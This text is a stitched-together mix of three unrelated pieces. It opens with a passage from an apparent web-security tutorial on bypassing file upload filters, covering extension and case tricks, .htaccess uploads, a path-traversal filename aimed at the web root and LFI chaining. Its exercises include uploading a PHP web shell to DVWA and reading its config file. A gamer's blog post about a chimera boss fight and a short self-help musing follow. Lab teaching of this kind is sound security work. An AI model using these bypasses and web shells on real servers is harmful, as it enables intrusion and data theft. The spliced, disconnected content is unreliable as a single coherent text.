6. **Try case variations** -- `.pHp`, `.PhP`, `.PHP` -- some filters are case-sensitive
7. **Try alternative extensions** -- `.php3`, `.php4`, `.php7`, `.phtml`, `.phar`, `.shtml`
8. **Try `.htaccess` upload** -- redefine what extensions get PHP processing
9. **Test for path traversal** -- `../../../var/www/html/shell.php` as the filename
10. **Check for LFI chaining** -- if you can upload a file but can't execute it directly, look for a Local File Inclusion vulnerability to include your uploaded file as code

Not every technique works on every target. The point of systematic testing is to find which one DOES work. Real-world upload forms use a patchwork of defenses -- some check extensions, some check Content-Type, some check magic bytes, some do all three. But almost none do ALL of the defense layers we covered, and finding the gap in their validation is the attacker's goal.

We've now covered the major web application vulnerability classes from episode 11 through this episode: injection attacks (SQL injection, XSS), trust-boundary attacks (CSRF, SSRF, authentication bypass), data-format attacks (insecure deserialization), and now input-type attacks (file uploads). Each one exploits a different aspect of how web applications handle untrusted input. Modern web applications don't just accept text input through forms -- they expose APIs that consume structured data, enforce business rules that can be subverted, and interact with client-side code that can be manipulated in ways the developers never anticipated.

### Exercises

**Exercise 1:** Exploit DVWA's file upload at Low security. Upload a PHP web shell, then use it to: (a) list all files in the web root, (b) read the DVWA database configuration file (`/var/www/dvwa/config/config.inc.php`), (c) list all running processes. Then try at Medium security using Content-Type bypass. Document which techniques work at each level. Save your findings in `~/lab-notes/file-upload-attacks.md`.

**Exercise 2:** Write a Python script called `upload_tester.py` that systematically tests file upload bypass techniques. The script should try at least 8 methods (the ones from this episode) and report which ones: (a) uploaded the file, (b) made it accessible, (c) achieved code execution. Test against DVWA at each security level. Save as `~/pentest-tools/upload_tester.py`.

**Exercise 3:** Build a secure file upload handler in Flask that implements ALL five defense layers from this episode: content-type detection via python-magic, random UUID filenames, storage outside web root, explicit Content-Type on download, and file size limits. Then attempt all bypass techniques against your handler. Document which attacks are blocked and why. Save everything in `~/upload-lab/`.

body.title: Burning the Beast.
body.body: > I encountered a terrifying chimera and attempted to defeat it using a mix of handgun fire and explosive gas cylinders. Despite taking damage from my own blast, I tried to burn the monster and followed up with arrows once my ammo ran out. I finally engaged in a desperate melee battle to finish the fight, but I was finished instead. ![](https://images.ecency.com/DQmZHcvLbw9fjBsBAsRNc4t4iJCGDgBZn8hYdw7qyEPFsqX/screenshot_1_.png) ![](https://images.ecency.com/DQmcoomhB3NFeH987HdtHP62W39B4bDzTxNEnLyY7bYEQWc/screenshot_2_.png) This chimera named Defect gave me a feel of fighting in a Resident Evil game because of its gruesome appearance. Its skin looked like a patchwork of different creatures, and the way it snarled made my blood run cold. ![](https://images.ecency.com/DQmWnmJvGb1VtAAPwrxx9GRFKeYUJYSDX7ehk8RreshMXqW/screenshot_3_.png) ![](https://images.ecency.com/DQmRhcwhu6HgopYKuvxT5UDBhH5rpBxog78N7azFja1VYTy/screenshot_4_.png) After jumping on the stone statue where the monster couldn't reach me, I started shooting it with my handgun for a moment to test its defenses. I could see the bullets sparking off its thick hide, but the creature didn't seem bothered by the small-caliber rounds. I kept firing, hoping to find a weak spot or at least distract it while I planned a more effective way to deal some real damage. ![](https://images.ecency.com/DQmZ7WdhkLCMkUJBkvTYGMNNFKAcLy6zUxXE6zgzPRbGhaw/screenshot_5_.png) When I understood I was not doing much from the safety of the statue, I jumped off that height to try and blast a gas cylinder. I moved quickly, keeping the central pillar between me and the chimera to avoid its attacks. ![](https://images.ecency.com/DQmYC8ymrLqZmxXuEb38kDYn2qYx22dswcsQjozowSuG8ww/screenshot_6_.png) ![](https://images.ecency.com/DQmY8JDDQnh94LxrdSm17bX4DCJgEjANeeU1zWAh5Jw9ZxD/screenshot_7_.png) ![](https://images.ecency.com/DQmSC9oC9Mca8NnCoNuTGdvRzuRup9BDu2VPiuZMC6pF3cs/screenshot_8_.png) I climbed on that ledge of the wall and I shot a cylinder from there, which blew up, and it didn't just damage the monster, it damaged me as well because I was standing far too close to the explosion. The force of the blast sent a shockwave through the air, and I even fell off the ledge, hitting the hard floor with a heavy thud. ![](https://images.ecency.com/DQmUjhfjuJeW2Qs4XyMhqYwCz6DXzzTJnbDsHjQFyLbznQE/screenshot_9_.png) ![](https://images.ecency.com/DQmXFVZciNH9wz5qxEaVoXKawdkFP5uta2rPceRSqVqDGBK/screenshot_10_.png) I climbed up the edge of that wall again despite the pain in my limbs to regain my tactical advantage. From there I shot down another gas cylinder which made a big blast and it looked like the monster was finally in trouble. ![](https://images.ecency.com/DQmYKe9CgtSwTjAVjfPhAmDAQcidJVcVDjV6H6QGYd7BK4Q/screenshot_11_.png) The monster got heavy damage for getting burned for a moment, and it stumbled blindly through the smoke-filled arena. I watched from above, hoping that the secondary explosions would be enough to finish the job. ![](https://images.ecency.com/DQmRXthqxSgM7x66zcQCJvN8aFTNMQDrQXmJx5sEP3S4fbT/screenshot_12_.png) ![](https://images.ecency.com/DQmScw9sfkmZbauhC6FvL6SfspDRZQLDQgpYgWqECgbbTKb/screenshot_13_.png) I was hoping the monster would die with the flame on his body, but it recovered after a moment and let out a roar. I started shooting it with the leftover arrows I had as I already spent all the bullets of the handgun during the initial phase of the fight. ![](https://images.ecency.com/DQmb2bWa7W1LiSH8f8AkCLiGKTP88ma9Rc2GJaEepnzjrYD/screenshot_14_.png) ![](https://images.ecency.com/DQmdS6YPSH3itHWvjbZHM6JSGP5AhgDa7gyoQSbYjEAW2G8/screenshot_15_.png) ![](https://images.ecency.com/DQmQhFFq74QNyi29JHkWJREUx2hvRgnhZVZNcjwv8QAM2FY/screenshot_16_.png) So, after shooting the beast with some arrows, it seemed like it was stunned for a moment. I jumped down and I started attacking it with my melee weapons, swinging with everything I had left. ![](https://images.ecency.com/DQmPYUikKhjqAMJbD8mYjSa58T8UMqQmKEinUD4uP1JoTHe/screenshot_17_.png) But suddenly, the beast turned around and it attacked me heavily, catching me with a powerful swipe that sent me flying across the room. I landed hard. Then the monster got to kill me without giving me chance to recover. I'll show what happens next later. --- I personally took all the screenshots from my play and I used a logo of the game from online to use in the thumbnail. This is Pikachuuuuu signing off. Over and out. --- ▶️ [3Speak](https://3speak.tv/watch?v=pikachuuuuu/98005592)

When your environment is full of stimuli that reminds you of that task in a positive way, you are more likely to carry out the task without difficulty. Or keeping company with people who engage in that particular task, still the same. 

I was thinking awhile back of how we humans, are just reactive beings. Our actions and decisions are just us reacting to all the stimuli the environment and our thoughts throw at us. 

Match your environment and thoughts with the type of person you want to be and they will help shape you into that person.
